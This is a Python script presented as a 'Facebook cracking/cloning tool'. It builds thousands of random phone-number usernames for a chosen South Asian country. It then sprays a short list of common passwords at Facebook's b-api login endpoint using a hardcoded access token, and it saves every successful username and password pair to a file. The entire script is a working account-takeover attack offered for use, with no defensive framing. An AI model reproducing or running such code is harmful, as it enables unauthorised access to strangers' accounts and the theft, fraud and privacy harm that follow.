import os, sys, time, requests, random
from datetime import datetime
from time import sleep

#------------------[ PASSWORD PROTECTION ]------------------#
password = "9774943"

def check_password():
    os.system("clear")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;97m  WELCOME TO ABD UR RAB FACEBOOK CRACKER")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    user_pass = input("\n\033[1;97mENTER PASSWORD: ")
    if user_pass != password:
        print("\n\033[1;91mWRONG PASSWORD! TRY AGAIN.\033[1;97m")
        sleep(2)
        check_password()
    else:
        print("\n\033[1;92mACCESS GRANTED! LOADING TOOL...\033[1;97m")
        sleep(2)

check_password()

#------------------[ TOOL INFO ]------------------#
def tool_info():
    os.system("clear")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;97m   FACEBOOK CLONING TOOL BY ABD UR RAB")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;97mTOOL VERSION    : \033[1;92mV1.0")
    print("\033[1;97mTOOL OWNER      : \033[1;92mABD UR RAB")
    print("\033[1;97mTOOL STATUS     : \033[1;92mACTIVE")
    print("\033[1;97mCURRENT TIME    : \033[1;92m" + datetime.now().strftime("%H:%M:%S"))
    print("\033[1;97mYOUR IP ADDRESS : \033[1;92m" + requests.get("https://api64.ipify.org").text)
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    sleep(3)

tool_info()

#------------------[ COUNTRY SELECTION ]------------------#
def country_selection():
    os.system("clear")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;97m  SELECT YOUR COUNTRY")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;97m[1] PAKISTAN")
    print("\033[1;97m[2] AFGHANISTAN")
    print("\033[1;97m[3] INDIA")
    print("\033[1;97m[4] BANGLADESH")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    choice = input("\n\033[1;97mSELECT COUNTRY: ")
    
    if choice == "1":
        country = "PAKISTAN"
        code = "92"
    elif choice == "2":
        country = "AFGHANISTAN"
        code = "93"
    elif choice == "3":
        country = "INDIA"
        code = "91"
    elif choice == "4":
        country = "BANGLADESH"
        code = "880"
    else:
        print("\n\033[1;91mINVALID CHOICE! TRY AGAIN.\033[1;97m")
        sleep(2)
        country_selection()
    
    print(f"\n\033[1;92mYOU SELECTED: {country} ({code})\033[1;97m")
    sleep(2)
    return code

code = country_selection()

#------------------[ RANDOM USER GENERATION ]------------------#
def generate_users():
    os.system("clear")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;97m  ENTER NUMBER OF IDS TO GENERATE")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    limit = input("\n\033[1;97mENTER LIMIT (e.g. 10000): ")
    
    try:
        limit = int(limit)
    except:
        print("\n\033[1;91mINVALID INPUT! TRY AGAIN.\033[1;97m")
        sleep(2)
        generate_users()
    
    print("\n\033[1;92mGENERATING IDS... PLEASE WAIT.\033[1;97m")
    sleep(3)
    
    user_list = []
    for _ in range(limit):
        user_list.append(code + str(random.randint(1000000000, 1999999999)))
    
    return user_list

user_list = generate_users()

#------------------[ CRACK FACEBOOK IDS ]------------------#
def facebook_crack():
    os.system("clear")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print("\033[1;97m  STARTING FACEBOOK CLONING")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    print(f"\033[1;97mTOTAL IDS: {len(user_list)}")
    print("\033[1;97mMETHOD: B-API & MBASIC")
    print("\033[1;92m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    
    success = []
    
    for user in user_list:
        for password in ["123456", "12345678", "123456789", "password", "pakistan"]:
            session = requests.Session()
            headers = {
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-G960F)",
                "Accept-Language": "en-US,en;q=0.9",
                "Content-Type": "application/x-www-form-urlencoded"
            }
            response = session.get(f"https://b-api.facebook.com/method/auth.login?email={user}&password={password}&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32", headers=headers).json()
            
            if "session_key" in response:
                print(f"\n\033[1;92m[SUCCESS] {user} | {password}\033[1;97m")
                success.append(f"{user} | {password}")
                open("successful_ids.txt", "a").write(f"{user} | {password}\n")
                break
    
    print("\n\033[1;92mCLONING COMPLETE! CHECK 'successful_ids.txt' FOR RESULTS.\033[1;97m")

facebook_crack()